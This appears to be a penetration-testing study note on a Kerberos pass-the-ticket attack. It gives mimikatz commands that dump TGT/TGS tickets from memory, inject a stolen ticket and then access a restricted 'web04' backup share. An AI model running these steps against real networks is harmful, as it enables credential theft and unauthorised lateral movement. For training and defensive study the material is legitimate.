~={red}The TGT only allows us to authenticate to the machine it was created for but the TGS can be used anywhere on the network but only for a specific service. If the ticket belongs to the currect user, no admin privs are required. This attack uses the TGS to gain access to a specific service=~

In mimikatz:
```
privilege::debug
```
- Export all TGT/TGS from memory
```
sekurlsa::tickets /export
```

In PS in same folder:
```
dir *.kirbi
```
- Copy the name of one of the tickets

Back in mimi, replace ticket name and inject it through mimikatz:
```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

In PS, check that the ticket has been injected:
```
klist
```
- Access previously restricted share service:
```
ls \\web04\backup
```
